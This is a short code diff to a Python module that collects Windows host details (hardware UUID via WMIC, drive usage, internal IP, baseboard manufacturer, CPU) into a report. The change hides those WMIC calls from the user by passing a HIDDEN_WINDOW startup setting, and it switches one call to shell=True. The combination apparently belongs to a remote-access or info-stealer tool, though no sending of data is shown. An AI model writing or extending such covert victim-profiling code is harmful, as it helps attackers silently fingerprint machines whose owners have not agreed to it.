@@ -12,6 +12,7 @@ from winreg import OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx
 from json import loads
 from uuid import UUID,getnode
 from manager.logger import Log
+from manager.manager import HIDDEN_WINDOW
 from preferences.config import config
 
 logo = '''
@@ -93,8 +94,7 @@ drive space available: {get_size(mount.free)}
 drive space used: {get_size(mount.used)}
 """
     try:
-        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=False,
-                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
+        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=PIPE, stderr=PIPE, startupinfo=HIDDEN_WINDOW).decode('utf-8').split('\n')[1].strip()
     except:
         Log(f"hwid ---> can't get")
         hwid = "Can't get"  
@@ -186,7 +186,7 @@ Internal IP: {internal_ip}
     if manufacturer:
         info += f"\nBaseBoard Manufacturer: {manufacturer}"
     try:
-        cpu = run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+        cpu = run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, startupinfo=HIDDEN_WINDOW).stdout.strip().split('\n')[2]
     except:
         cpu = processor()
 
